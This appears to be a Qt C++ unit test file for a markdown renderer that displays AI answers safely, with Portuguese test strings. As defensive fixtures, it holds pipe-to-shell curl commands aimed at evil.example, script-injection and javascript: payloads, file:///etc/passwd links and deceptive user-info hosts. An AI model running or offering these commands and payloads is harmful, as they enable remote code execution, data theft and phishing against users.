#include <QtTest>
#include <QGuiApplication>
#include <QRegularExpression>
#include <QSettings>
#include <QSignalSpy>
#include <QTemporaryDir>
#include <QTextBlock>
#include <QTextDocument>
#include <QTextFragment>
#include <QTextList>
#include <QTextTable>
#include "AnswerText.h"
#include "Answers.h"
#include "AppState.h"
#include "Theme.h"

using namespace farol;

namespace {
const AnswerStyle kStyle{QStringLiteral("#8FB3C7"), QStringLiteral("#071828"), QStringLiteral("#22466B"), QStringLiteral("Instrument Sans"),
                         QStringLiteral("monospace")};

// The answer as a rich text item reads it back from the HTML.
struct Shown {
    QString html;
    QTextDocument doc;
    explicit Shown(const QString &markdown) : html(answerHtml(markdown, kStyle)) { doc.setHtml(html); }
    QString text() const   // as it reads: the empty blocks Qt keeps around a table take no room
    {
        const auto inTable = [](const QTextBlock &b) { return b.isValid() && QTextCursor(b).currentTable(); };
        QStringList lines;
        for (QTextBlock b = doc.begin(); b.isValid(); b = b.next())
            if (!b.text().isEmpty() || inTable(b) || !(inTable(b.previous()) || inTable(b.next())))
                lines << b.text();
        return lines.join(QLatin1Char('\n')).replace(QChar::LineSeparator, QLatin1Char('\n')).replace(QChar::Nbsp, QLatin1Char(' '));
    }
    QTextBlock block(const QString &text) const
    {
        for (QTextBlock b = doc.begin(); b.isValid(); b = b.next())
            if (b.text() == text)
                return b;
        return {};
    }
    QTextCharFormat format(const QString &text) const   // of the piece of text that reads exactly so
    {
        for (QTextBlock b = doc.begin(); b.isValid(); b = b.next())
            for (auto it = b.begin(); !it.atEnd(); ++it)
                if (it.fragment().text() == text)
                    return it.fragment().charFormat();
        return {};
    }
    QStringList links() const
    {
        QStringList out;
        for (QTextBlock b = doc.begin(); b.isValid(); b = b.next())
            for (auto it = b.begin(); !it.atEnd(); ++it)
                if (it.fragment().charFormat().isAnchor() && !out.contains(it.fragment().charFormat().anchorHref()))
                    out << it.fragment().charFormat().anchorHref();
        return out;
    }
};

// A code block is drawn as a box: a table of one cell on the code background, with no border.
bool onCode(const QTextBlock &block)
{
    const QTextTable *box = block.isValid() ? QTextCursor(block).currentTable() : nullptr;
    return box && box->rows() == 1 && box->columns() == 1 && box->format().border() == 0
        && box->format().background().style() != Qt::NoBrush && box->format().background().color() == QColor(kStyle.codeBg);
}
bool mono(const QTextCharFormat &format)
{
    return format.fontFamilies().toStringList() == QStringList{kStyle.monoFont};
}
} // namespace

class TestAnswerText : public QObject {
    Q_OBJECT
    QTemporaryDir dir;

private slots:
    void rawHtmlIsShownAsTextAndWhatComesAfterItSurvives()
    {
        const Shown bold("Antes <b>forte</b> e depois.");
        QCOMPARE(bold.text(), QStringLiteral("Antes <b>forte</b> e depois."));

        const Shown image("Antes <img src=\"http://127.0.0.1:9/raw.png\" width=\"1\"> e depois.\n\nOutro parágrafo.");
        QVERIFY2(!image.html.contains("<img"), qPrintable(image.html));
        QVERIFY(image.text().contains("<img src=\"http://127.0.0.1:9/raw.png\" width=\"1\"> e depois."));
        QVERIFY(image.text().contains("Outro parágrafo."));

        const Shown style("Um.\n\n<style>p{background:url(http://127.0.0.1:9/s.png)}</style>\n\n<details><summary>mais</summary>dentro</details>\n\nDepois de tudo.");
        QCOMPARE(style.html.count("<style"), 1);                       // the exporter's own, in the head
        QVERIFY(style.text().contains("<style>p{background:url(http://127.0.0.1:9/s.png)}</style>"));
        QVERIFY(style.text().contains("<summary>mais</summary>dentro"));
        QVERIFY(style.text().contains("Depois de tudo."));

        const Shown br("a<br>b");                                      // a line break is the one tag that is not text
        QCOMPARE(br.text(), QStringLiteral("a\nb"));
    }

    void anImageBecomesItsAltText()
    {
        // (Qt's importer leaves out an image whose alt text is empty: nothing is shown and nothing is fetched)
        const Shown s("Veja ![um gato](http://127.0.0.1:9/inline.png) e ![de referência][r] e ![ ](http://127.0.0.1:9/noalt.png) e "
                      "![local](file:///etc/passwd) e ![](http://127.0.0.1:9/empty.png).\n\n"
                      "[r]: http://127.0.0.1:9/ref.png\n\n"
                      "| a | b |\n|---|---|\n| ![na célula](http://127.0.0.1:9/cell.png) | x |\n\n"
                      "[![com link](http://127.0.0.1:9/linked.png)](https://example.com/alvo)\n");
        QVERIFY2(!s.html.contains("<img"), qPrintable(s.html));
        QVERIFY2(!s.html.contains("src="), qPrintable(s.html));
        QVERIFY2(!s.html.contains("127.0.0.1"), qPrintable(s.html));
        QVERIFY2(!s.html.contains("passwd"), qPrintable(s.html));
        QVERIFY(!s.text().contains(QChar::ObjectReplacementCharacter));
        QVERIFY2(s.text().contains("Veja [imagem: um gato] e [imagem: de referência] e [imagem] e [imagem: local] e ."), qPrintable(s.text()));
        QVERIFY(s.block("[imagem: na célula]").isValid());              // alone in its cell
        QVERIFY(s.block("[imagem: com link]").isValid());               // (Qt's importer forgets the link around an image)
    }

    // The places of a link and of an image where a model could try to write HTML of its own.
    void titlesAltTextsAndAddressesAreNotReadAsHtml()
    {
        const Shown s("[um](https://example.com/a \"t\\\"><img src='http://127.0.0.1:9/title.png'>\") e "
                      "![\"><img src=http://127.0.0.1:9/alt.png>](http://127.0.0.1:9/i.png \"<img src=http://127.0.0.1:9/t2.png>\") e "
                      "[dois](https://example.com/\"onmouseover=\"x) e <https://example.com/b\"><img src=x>> e "
                      "`<img src=\"http://127.0.0.1:9/code.png\">`.\n\n"
                      "```html\n<img src=\"http://127.0.0.1:9/fenced.png\"><script>alert(1)</script>\n```\n");
        QVERIFY2(!s.html.contains("<img") && !s.html.contains("<script"), qPrintable(s.html));
        QVERIFY2(!s.html.contains("\"onmouseover="), qPrintable(s.html));
        for (QTextBlock b = s.doc.begin(); b.isValid(); b = b.next())
            for (auto it = b.begin(); !it.atEnd(); ++it)
                QVERIFY2(!it.fragment().charFormat().isImageFormat(), qPrintable(b.text()));
        for (const QString &link : s.links())
            QVERIFY2(isWebLink(link) && link.startsWith("https://example.com/"), qPrintable(link));
        QVERIFY(s.links().contains("https://example.com/a"));
        QVERIFY2(s.text().contains("<img src=\"http://127.0.0.1:9/code.png\">"), qPrintable(s.text()));      // code is shown as written
        QVERIFY2(s.text().contains("<img src=\"http://127.0.0.1:9/fenced.png\"><script>alert(1)</script>"), qPrintable(s.text()));
    }

    void onlyWebLinksAreLinks_data()
    {
        QTest::addColumn<QString>("href");
        QTest::addColumn<bool>("web");
        QTest::newRow("http") << "http://a.b/c" << true;
        QTest::newRow("https") << "https://a.b" << true;
        QTest::newRow("upper case") << "HTTPS://A.B/x" << true;
        QTest::newRow("address and port") << "http://127.0.0.1:1/x" << true;
        QTest::newRow("query") << "https://example.com/a?x=1&y=2#z" << true;
        QTest::newRow("file") << "file:///etc/passwd" << false;
        QTest::newRow("javascript") << "javascript:alert(1)" << false;
        QTest::newRow("no scheme") << "//evil.com/x" << false;
        QTest::newRow("path") << "/etc/passwd" << false;
        QTest::newRow("relative") << "docs/readme.md" << false;
        QTest::newRow("no host") << "http:///nohost" << false;
        QTest::newRow("ftp") << "ftp://a.b/x" << false;
        QTest::newRow("mailto") << "mailto:a@b.c" << false;
        QTest::newRow("data") << "data:text/html,x" << false;
        QTest::newRow("editor") << "vscodium://anthropic.claude-code/open" << false;
        QTest::newRow("smb") << "smb://host/share" << false;
        QTest::newRow("user info") << "https://good.com@evil.com/" << false;
        QTest::newRow("user and password") << "https://user:pw@evil.com/" << false;
        QTest::newRow("backslash") << "https://good.com\\@evil.com/" << false;
        QTest::newRow("empty") << "" << false;
    }
    void onlyWebLinksAreLinks()
    {
        QFETCH(QString, href);
        QFETCH(bool, web);
        QCOMPARE(isWebLink(href), web);
        const Shown s(QStringLiteral("Antes [o texto](%1) depois.").arg(href));
        QCOMPARE(s.text(), QStringLiteral("Antes o texto depois."));    // the text of a link that is refused stays
        QCOMPARE(s.links(), web ? QStringList{href} : QStringList());
        QCOMPARE(s.html.contains("href="), web);
    }

    void aWebLinkIsParsedStrictly()
    {
        QVERIFY(isWebLink("https://example.com/a%20b"));
        QVERIFY(!isWebLink(" https://example.com/ "));                 // nothing is trimmed or guessed
        QVERIFY(!isWebLink("https://example.com/a b"));
        QVERIFY(!isWebLink("https://exa mple.com/"));
        QVERIFY(!isWebLink("https://@evil.com/"));
        QVERIFY(!isWebLink("example.com"));
        QVERIFY(!isWebLink("https:example.com"));
    }

    // The line that says where a link goes shows the host on its own (the name that counts is at its end, and a
    // long address is cut somewhere), in the letters the network uses, and what comes after it as it is sent.
    void aLinkSaysWhichHostItGoesTo_data()
    {
        QTest::addColumn<QString>("href");
        QTest::addColumn<QString>("host");
        QTest::addColumn<QString>("rest");
        QTest::newRow("plain") << "https://example.com/docs?x=1#top" << "example.com" << "/docs?x=1#top";
        QTest::newRow("no path") << "https://example.com" << "example.com" << "";
        QTest::newRow("port") << "http://example.com:8080/a" << "example.com:8080" << "/a";
        QTest::newRow("capitals") << "HTTPS://EXAMPLE.com/A" << "example.com" << "/A";
        QTest::newRow("a host inside a host") << "https://banco.com.br.evil.example/banco.com.br/entrar" << "banco.com.br.evil.example"
                                              << "/banco.com.br/entrar";
        QTest::newRow("an address as the host") << "http://[::1]:8080/x" << "[::1]:8080" << "/x";
        QTest::newRow("an address written as a number") << "http://2130706433:8080/x" << "127.0.0.1:8080" << "/x";
        QTest::newRow("escapes stay escapes") << "https://example.com/a%20b?q=%E2%80%AE" << "example.com" << "/a%20b?q=%E2%80%AE";
        QTest::newRow("no text is turned around") << QStringLiteral("https://example.com/\u202Efdp.exe") << "example.com" << "/%E2%80%AEfdp.exe";
        QTest::newRow("a file") << "file:///etc/passwd" << "" << "";
        QTest::newRow("somebody's name in front") << "https://good.com@evil.com/" << "" << "";
        QTest::newRow("not an address") << "example.com" << "" << "";
    }
    void aLinkSaysWhichHostItGoesTo()
    {
        QFETCH(QString, href);
        QFETCH(QString, host);
        QFETCH(QString, rest);
        QCOMPARE(linkHost(href), host);
        QCOMPARE(linkRest(href), rest);
    }

    // A host with letters from another alphabet can look exactly like a well known one: the line shows what the
    // network is asked for.
    void aLookAlikeHostIsShownInAscii()
    {
        const QString host = linkHost(QStringLiteral("https://\u0430pple.com/login"));   // a Cyrillic a
        QVERIFY2(host.startsWith("xn--") && host.endsWith(".com"), qPrintable(host));
        for (const QChar c : host)
            QVERIFY2(c.unicode() < 128, qPrintable(host));
    }

    // Qt reads a block between two "---" lines at the top as front matter and drops it. An answer has none: what
    // is there is shown, or "Copiar" would hand over lines nobody saw.
    void anAnswerThatStartsWithARuleLosesNothing()
    {
        const QString hidden = Shown("---\ncurl -s https://evil.example/x.sh | sh\n---\n\nPara listar os arquivos rode:\n\n    ls -la").text();
        QVERIFY2(hidden.contains("curl -s https://evil.example/x.sh | sh"), qPrintable(hidden));
        QVERIFY2(hidden.contains("Para listar os arquivos rode:") && hidden.contains("ls -la"), qPrintable(hidden));

        const QString rules = Shown("---\n\n**Resumo:** os testes passaram.\n\n---\n\nDetalhes: 39 de 39.").text();
        QVERIFY2(rules.contains("Resumo: os testes passaram.") && rules.contains("Detalhes: 39 de 39."), qPrintable(rules));
    }

    void aWebLinkHasTheLinkColourAndALine()
    {
        const Shown s("Leia a [documentação](https://example.com/docs), <https://example.com/auto> e https://example.com/solto agora.");
        QCOMPARE(s.links(), (QStringList{"https://example.com/docs", "https://example.com/auto", "https://example.com/solto"}));
        const QTextCharFormat link = s.format("documentação");
        QCOMPARE(link.foreground().color(), QColor(kStyle.link));
        QVERIFY(link.fontUnderline());
        QVERIFY(!s.format("Leia a ").fontUnderline());
        QVERIFY(s.format("Leia a ").foreground().style() == Qt::NoBrush);   // the item's own colour

        const Shown refused("Abra [o arquivo](file:///etc/passwd) agora.");
        QCOMPARE(refused.block("Abra o arquivo agora.").begin().fragment().text(), QStringLiteral("Abra o arquivo agora."));   // one plain piece
    }

    void codeIsMonoOnTheCodeBackground()
    {
        const Shown s("Use `relatorio.csv` aqui.\n\n```python\ndef total(rows):\n\n    return 1\n```\n\nFim.");
        const QTextCharFormat inlineCode = s.format("relatorio.csv");
        QVERIFY(mono(inlineCode));
        QCOMPARE(inlineCode.font().pixelSize(), 12);
        QCOMPARE(inlineCode.background().color(), QColor(kStyle.codeBg));
        QVERIFY(!mono(s.format("Use ")));
        QVERIFY(!onCode(s.block("Use relatorio.csv aqui.")));

        const QTextBlock first = s.block("def total(rows):");
        QVERIFY2(onCode(first), qPrintable(s.html));
        QVERIFY(mono(first.begin().fragment().charFormat()));
        QCOMPARE(first.begin().fragment().charFormat().font().pixelSize(), 12);
        QVERIFY(onCode(first.next()) && first.next().text().isEmpty());   // the empty line of the block is part of it
        QVERIFY(onCode(s.block("    return 1")));                         // and the indentation is kept
        QVERIFY(!onCode(s.block("Fim.")));
        QVERIFY(!mono(s.format("Fim.")));
    }

    void everyCodeBlockHasItsOwnBox()
    {
        const Shown s("```sh\num\n```\n```python\ndois\n```\n\n> Citação:\n>\n> ```\n> três\n> ```\n\n| a |\n|---|\n| b |\n\n```\nquatro\n```\n\n    cinco\n\nFim.");
        QCOMPARE(s.text(), QStringLiteral("um\ndois\nCitação:\ntrês\na\nb\nquatro\ncinco\nFim."));
        QList<const QTextTable *> boxes;
        for (const char *line : {"um", "dois", "três", "quatro", "cinco"}) {
            const QTextBlock block = s.block(QString::fromUtf8(line));
            QVERIFY2(onCode(block), line);
            QVERIFY2(mono(block.begin().fragment().charFormat()), line);
            const QTextTable *box = QTextCursor(block).currentTable();
            QVERIFY2(!boxes.contains(box), line);
            boxes << box;
        }
        QVERIFY(!onCode(s.block("b")));                                  // a table of the answer is not a box
        QVERIFY(!onCode(s.block("Fim.")));
    }

    // Whatever comes, something readable goes out.
    void oddAnswersAreStillAnswers_data()
    {
        QTest::addColumn<QString>("markdown");
        QTest::addColumn<QString>("text");
        QTest::newRow("empty fence") << "antes\n\n```\n```\n\ndepois" << "antes\ndepois";
        QTest::newRow("fence first, text after") << "```\ncódigo\n```\ndepois" << "código\ndepois";
        QTest::newRow("only a list item with code") << "- ```\n  a\n  b\n  ```" << "a\nb";
        QTest::newRow("code ends a list") << "1. um\n2. dois\n   ```\n   x\n   ```\n\nfim" << "um\ndois\nx\nfim";
        QTest::newRow("code in a nested list") << "- um\n  - dois\n    ```\n    x\n    ```\n  - três\n- quatro" << "um\ndois\nx\ntrês\nquatro";
        QTest::newRow("table then code then table") << "| a |\n|---|\n| b |\n\n```\nx\n```\n\n| c |\n|---|\n| d |" << "a\nb\nx\nc\nd";
        QTest::newRow("only a table") << "| a |\n|---|\n| b |" << "a\nb";
        QTest::newRow("only a heading") << "# Título" << "Título";
        QTest::newRow("only a break") << "<br>" << "";
        QTest::newRow("an image and nothing else") << "![só isto](http://127.0.0.1:9/x.png)" << "[imagem: só isto]";
        QTest::newRow("windows line ends") << "um\r\n\r\n```\r\ncódigo\r\n```\r\n\r\ndois<br>três\r\n" << "um\ncódigo\ndois\ntrês";
    }
    void oddAnswersAreStillAnswers()
    {
        QFETCH(QString, markdown);
        QFETCH(QString, text);
        const Shown s(markdown);
        QCOMPARE(s.text(), text);
        QVERIFY(!s.html.contains("<img"));
    }

    // Qt leaves the fence's block properties on the list item that follows it, and counts the block as an item.
    void theListItemAfterAFencedBlockIsNotCode()
    {
        const Shown s("1. Abra o arquivo\n2. Rode o comando:\n   ```sh\n   awk -F';' '{ s += $2 }' relatorio.csv\n   ```\n3. Confira o resultado\n\nDepois.");
        const QTextBlock code = s.block("awk -F';' '{ s += $2 }' relatorio.csv");
        QVERIFY2(onCode(code), qPrintable(s.html));
        QVERIFY(mono(code.begin().fragment().charFormat()));
        const QTextBlock after = s.block("Confira o resultado");
        QVERIFY(after.isValid());
        QVERIFY(!onCode(after));
        QVERIFY(!mono(after.begin().fragment().charFormat()));
        QVERIFY(!after.blockFormat().nonBreakableLines());
        QVERIFY(!code.blockFormat().nonBreakableLines());                // a long line of code wraps
        // the code is not an item of its own: the list goes on counting
        QVERIFY(after.textList());
        QCOMPARE(after.textList()->itemText(after), QStringLiteral("3."));
        QVERIFY(!code.textList());
        QCOMPARE(s.block("Rode o comando:").textList()->itemText(s.block("Rode o comando:")), QStringLiteral("2."));
    }

    void headingsAreParagraphsNotMuchBiggerThanTheBody()
    {
        const Shown s("# Um\n\ncorpo\n\n## Dois\n\n### Três com `código`\n\n#### Quatro\n\n###### Seis");
        QVERIFY2(!s.html.contains(QRegularExpression("<h[1-6]")), qPrintable(s.html));
        const QList<QPair<QString, int>> sizes{{"Um", 16}, {"Dois", 15}, {"Três com ", 14}, {"Quatro", 14}, {"Seis", 14}};
        for (const auto &[text, size] : sizes) {
            const QTextCharFormat f = s.format(text);
            QVERIFY2(f.isValid(), qPrintable(text));
            QCOMPARE(f.font().pixelSize(), size);
            QCOMPARE(f.fontWeight(), int(QFont::DemiBold));
        }
        QVERIFY(mono(s.format("código")));
        QCOMPARE(s.format("corpo").font().pixelSize(), 13);
        QCOMPARE(s.format("corpo").fontWeight(), int(QFont::Normal));
        QCOMPARE(s.block("Um").blockFormat().headingLevel(), 0);
        QVERIFY(s.block("Dois").blockFormat().topMargin() > 0);          // room above a heading that is not the first line
        QCOMPARE(s.block("Um").blockFormat().topMargin(), 0.0);
    }

    void entitiesComeOutOnce()
    {
        const Shown s("Cliente &amp; filial, R$ &lt;com imposto&gt;, &copy; 2026, 5 < 6 & 7 > 2, `a &amp; b`.");
        QCOMPARE(s.text(), QStringLiteral("Cliente & filial, R$ <com imposto>, © 2026, 5 < 6 & 7 > 2, a &amp; b."));
    }

    void anUnclosedFenceIsCodeToTheEnd()
    {
        const Shown s("Texto.\n\n```\ncerca sem fechar\nultima linha");
        QVERIFY(onCode(s.block("cerca sem fechar")));
        QVERIFY(onCode(s.block("ultima linha")));
        QVERIFY(!onCode(s.block("Texto.")));
    }

    void anAnswerMayBeOnlyACodeBlock()
    {
        const Shown s("```sh\nctest --output-on-failure\n```");
        QCOMPARE(s.text(), QStringLiteral("ctest --output-on-failure"));
        QVERIFY(onCode(s.block("ctest --output-on-failure")));
        QVERIFY(answerHtml(QString(), kStyle).isEmpty());
        QVERIFY(answerHtml(QStringLiteral(" \n\n"), kStyle).isEmpty());
    }

    void aTableHasAThinBorderAndPadding()
    {
        const Shown s("| Coluna | Tipo |\n|---|---|\n| a | texto |\n| b | número |\n\nDepois.");
        QTextTable *table = QTextCursor(s.block("Coluna")).currentTable();
        QVERIFY(table);
        QCOMPARE(table->rows(), 3);
        QCOMPARE(table->columns(), 2);
        QCOMPARE(table->format().border(), 1.0);
        QCOMPARE(table->format().cellPadding(), 4.0);
        QCOMPARE(table->format().borderBrush().color(), QColor(kStyle.line));
        QCOMPARE(table->cellAt(2, 1).firstCursorPosition().block().text(), QStringLiteral("número"));
    }

    void aBrIsALineBreakOutsideCode_data()
    {
        QTest::addColumn<QString>("markdown");
        QTest::addColumn<QString>("text");
        QTest::newRow("plain") << "Quebra<br>manual" << "Quebra\nmanual";
        QTest::newRow("closed") << "Quebra<br/>manual" << "Quebra\nmanual";
        QTest::newRow("closed with a space") << "Quebra<br />manual" << "Quebra\nmanual";
        QTest::newRow("upper case") << "Quebra<BR>manual e <Br/>outra" << "Quebra\nmanual e\noutra";
        QTest::newRow("spaces around") << "Quebra <br> manual" << "Quebra\nmanual";
        QTest::newRow("two") << "Quebra<br><br>manual" << "Quebra\n\nmanual";
        QTest::newRow("at the end") << "Quebra<br>\n\nmanual" << "Quebra\nmanual";              // two paragraphs, no empty line
        QTest::newRow("in emphasis") << "**um**<br>**dois**" << "um\ndois";
        QTest::newRow("after an address") << "Veja https://example.com/a<br>depois" << "Veja https://example.com/a\ndepois";
        QTest::newRow("fenced code") << "```html\num<br>dois <BR/> três\n```" << "um<br>dois <BR/> três";
        QTest::newRow("tilde fence") << "~~~\num<br>dois\n~~~" << "um<br>dois";
        QTest::newRow("unclosed fence") << "antes<br>disso\n\n```\num<br>dois" << "antes\ndisso\num<br>dois";
        QTest::newRow("inline code") << "Use `<br>` ou `a <br/> b` para quebrar." << "Use <br> ou a <br/> b para quebrar.";
        QTest::newRow("indented code") << "Assim:\n\n    um<br>dois\n\nfim" << "Assim:\num<br>dois\nfim";
        QTest::newRow("other tags stay") << "um<br clear=\"all\">dois</br>três" << "um<br clear=\"all\">dois</br>três";
    }
    void aBrIsALineBreakOutsideCode()
    {
        QFETCH(QString, markdown);
        QFETCH(QString, text);
        QCOMPARE(Shown(markdown).text(), text);
    }

    void aBrKeepsItsParagraphItsListItemAndItsTableRow()
    {
        const Shown paragraph("Quebra<br>manual e fim.");
        QCOMPARE(paragraph.doc.blockCount(), 1);                        // one paragraph, two lines
        QVERIFY(paragraph.doc.begin().text().contains(QChar::LineSeparator));

        const Shown list("- um<br>dois\n- três");
        const QTextBlock first = list.doc.begin();
        QCOMPARE(list.doc.blockCount(), 2);                             // still two items
        QCOMPARE(first.text(), QStringLiteral("um") + QChar(QChar::LineSeparator) + QStringLiteral("dois"));
        QVERIFY(first.textList() && first.next().textList());

        const Shown table("| Passo | Nota |\n|---|---|\n| abrir<br>ler<BR/>fechar | x |\n\nfora<br>dela");
        QVERIFY2(table.block("abrir ler fechar").isValid(), qPrintable(table.text()));   // a table row is one line: a space
        QVERIFY(table.block(QStringLiteral("fora") + QChar(QChar::LineSeparator) + QStringLiteral("dela")).isValid());

        // a character the conversion uses for its own marks is the answer's all the same
        const QString odd = QStringLiteral("um") + QChar(0xE000) + QStringLiteral("dois<br>três ") + QChar(0xE001);
        QCOMPARE(Shown(odd).text(), QStringLiteral("um") + QChar(0xE000) + QStringLiteral("dois\ntrês ") + QChar(0xE001));
    }

    void aLongAnswerConvertsInTime()
    {
        QString markdown;
        int lines = 0;
        for (int i = 0; lines < 2000; ++i) {
            markdown += QStringLiteral("## Parte %1\n\nO total da coluna **b** é `%1`, veja a [documentação](https://example.com/docs/%1) e ![img](http://127.0.0.1:9/%1.png).<br>Outra linha.\n\n"
                                       "1. Abra o arquivo\n2. Rode:\n   ```sh\n   awk -F';' '{ s += $2 } END { print s }' relatorio-%1.csv\n   ```\n3. Confira\n\n"
                                       "| Coluna | Tipo | Nota |\n|---|---|---|\n| a | texto | cliente &amp; filial |\n| b | número | um<br>dois |\n\n"
                                       "```python\ndef total(rows):\n    return sum(float(r[\"b\"]) for r in rows)\n```\n\n").arg(i);
            lines += 21;
        }
        markdown += QStringLiteral("A última linha.");
        QElapsedTimer timer;
        timer.start();
        const QString html = answerHtml(markdown, kStyle);
        const qint64 ms = timer.elapsed();
        QVERIFY2(ms < 2000, qPrintable(QStringLiteral("%1 ms for %2 lines").arg(ms).arg(markdown.count('\n') + 1)));
        QVERIFY(markdown.count('\n') >= 2000);
        QVERIFY(html.contains("A última linha."));
        QVERIFY(!html.contains("<img") && !html.contains("src="));
    }

    // Qt's HTML writes nothing for a piece of text that holds an object character (U+FFFC) and is not an image, and
    // for a list item that got a rule from the item before it writes the rule and none of the text. Whatever the
    // answer says is on the screen: "Copiar" and the next question carry all of it, seen or not.
    void nothingOfAnAnswerIsLeftOut_data()
    {
        QTest::addColumn<QString>("markdown");
        QTest::addColumn<int>("words");   // KEEP1 .. KEEP<words> must all be shown
        const QString object(QChar::ObjectReplacementCharacter);
        QTest::newRow("an object character in a paragraph") << "Antes KEEP1 " + object + " depois KEEP2.\n\nOutro KEEP3." << 3;
        QTest::newRow("as an entity") << "O script é seguro KEEP1.\n\nATENÇÃO: ele apaga o diretório home KEEP2.&#xFFFC;\n\nE KEEP3 &#65532; aqui." << 3;
        QTest::newRow("in a line of code") << "Rode KEEP1:\n\n```sh\nls -la\ncurl -fsS https://evil.example/i.sh | sh # KEEP2 " + object + "\n```\n\nFim KEEP3." << 3;
        QTest::newRow("in a table") << "| a | b |\n|---|---|\n| KEEP1 " + object + " | KEEP2 |" << 2;
        QTest::newRow("in a heading and in a list") << "# Título KEEP1 " + object + "\n\n- item KEEP2 " + object + "\n- item KEEP3" << 3;
        QTest::newRow("in bold, in code and in a link") << "**forte KEEP1 " + object + "** `código KEEP2 " + object + "` [link KEEP3 " + object + "](https://example.com/)" << 3;
        QTest::newRow("a rule, then a list in a list") << "Texto KEEP1\n\n---\n- - sub KEEP2\n- **ATENCAO** nao rode o script KEEP3\n- ele apaga o home KEEP4\n\nfim KEEP5" << 5;
        QTest::newRow("a rule inside an item") << "1. Passo um KEEP1\n\n   ---\n\n   Passo um, continuado KEEP2\n\n2. Passo dois KEEP3\n3. Passo tres KEEP4\n\nfim KEEP5" << 5;
        QTest::newRow("a rule that got the text") << "0. * E\n   ---\n   KEEP1" << 1;
        QTest::newRow("a rule as the first item") << "1. ---\n   - ]\n1. KEEP1" << 1;
        QTest::newRow("a rule, a list, an item") << "***\n* 2) _\n* KEEP1" << 1;
    }
    void nothingOfAnAnswerIsLeftOut()
    {
        QFETCH(QString, markdown);
        QFETCH(int, words);
        const Shown shown(markdown);
        const QString text = shown.text();
        for (int i = 1; i <= words; ++i)
            QVERIFY2(text.contains(QStringLiteral("KEEP%1").arg(i)), qPrintable(QStringLiteral("KEEP%1 is not in: %2").arg(i).arg(text)));
        QVERIFY2(!shown.html.contains("<li<"), qPrintable(shown.html));
        QVERIFY(!shown.html.contains(QChar::ObjectReplacementCharacter));
    }

    // One paragraph with thousands of pieces (a model's answer can be that) does not hold the island still: the passes
    // over the document must not ask it for a layout at every step.
    void aCrowdedParagraphConvertsInTime_data()
    {
        QTest::addColumn<QString>("markdown");
        QTest::newRow("8000 pieces of code") << QStringLiteral("`a` ").repeated(8000);
        QTest::newRow("6400 breaks") << QStringLiteral("abc<br>").repeated(6400);
        QTest::newRow("3000 links") << QStringLiteral("[a](https://example.com/a) ").repeated(3000);
    }
    void aCrowdedParagraphConvertsInTime()
    {
        QFETCH(QString, markdown);
        QElapsedTimer timer;
        timer.start();
        const QString html = answerHtml(markdown, kStyle);
        const qint64 ms = timer.elapsed();
        QVERIFY2(ms < 1500, qPrintable(QStringLiteral("%1 ms for %2 characters").arg(ms).arg(markdown.size())));
        QVERIFY(!html.isEmpty());
    }

    // The same HTML with or without a display: nothing of it comes from the application's font.
    void theOutputDoesNotDependOnAGuiApplication()
    {
        QVERIFY(!qobject_cast<QGuiApplication *>(QCoreApplication::instance()));
        const QString html = answerHtml("# Título\n\nTexto com `código` e [link](https://example.com).\n\n```\nbloco\n```\n\n| a |\n|---|\n| b |\n", kStyle);
        QVERIFY2(html.contains("<body style=\" font-family:'Instrument Sans'; font-size:13px;"), qPrintable(html));
        QVERIFY2(!html.contains(QRegularExpression("font-size:[0-9.]+pt")), qPrintable(html));
        auto families = QRegularExpression("font-family:([^;]*);").globalMatch(html);
        int seen = 0;
        while (families.hasNext()) {
            const QString family = families.next().captured(1);
            QVERIFY2(family == "'Instrument Sans'" || family == "'monospace'", qPrintable(family));
            ++seen;
        }
        QVERIFY(seen >= 3);                                             // the body, the inline code, the block
    }

    // ---- the object the view talks to ----

    void answersAreDrawnInTheThemeAndConvertedOnce()
    {
        QSettings settings(dir.path() + "/a.ini", QSettings::IniFormat);
        AppState state(&settings);
        Theme theme(&state);
        theme.setSystemDark(true);
        Answers answers(&theme);
        const QString markdown = QStringLiteral("Veja a [documentação](https://example.com/docs) e `isto`.");
        const QString dark = answers.html(markdown, true);
        QVERIFY2(dark.contains("color:" + theme.link().toLower()), qPrintable(dark));
        QVERIFY(dark.contains("background-color:" + theme.codeBg().toLower()));
        QVERIFY(dark.contains("font-family:'" + theme.monoFont() + "'"));
        QCOMPARE(dark, answerHtml(markdown, {theme.link(), theme.codeBg(), theme.line(), theme.bodyFont(), theme.monoFont()}));
        QCOMPARE(answers.conversions(), 1);
        for (int i = 0; i < 5; ++i)
            QCOMPARE(answers.html(markdown, true), dark);
        QCOMPARE(answers.conversions(), 1);                             // a conversation is not converted again at every change
        QVERIFY(answers.html(markdown + " Mais.", true) != dark);
        QCOMPARE(answers.conversions(), 2);

        const QString darkLink = theme.link();
        theme.setSystemDark(false);
        QVERIFY(theme.link() != darkLink);
        const QString light = answers.html(markdown, false);
        QVERIFY2(light.contains("color:" + theme.link().toLower()) && !light.contains("color:" + darkLink.toLower()), qPrintable(light));
        QCOMPARE(answers.conversions(), 3);
        theme.setSystemDark(true);
        QCOMPARE(answers.html(markdown, true), dark);                   // back: still kept
        QCOMPARE(answers.conversions(), 3);
    }

    void onlyAWebLinkIsOpened()
    {
        QSettings settings(dir.path() + "/o.ini", QSettings::IniFormat);
        AppState state(&settings);
        Theme theme(&state);
        Answers answers(&theme);
        QSignalSpy opened(&answers, &Answers::openRequested);
        for (const char *link : {"file:///etc/passwd", "javascript:alert(1)", "https://good.com@evil.com/", "/etc/passwd", "vscodium://x/y", ""}) {
            QVERIFY2(!answers.isWebLink(link), link);
            answers.open(link);
        }
        QCOMPARE(opened.count(), 0);
        QVERIFY(answers.isWebLink("https://example.com/docs?x=1"));
        answers.open("https://example.com/docs?x=1");
        QCOMPARE(opened.count(), 1);
        QCOMPARE(opened.first().first().toUrl(), QUrl("https://example.com/docs?x=1"));
    }
};

QTEST_GUILESS_MAIN(TestAnswerText)
#include "tst_answer_text.moc"
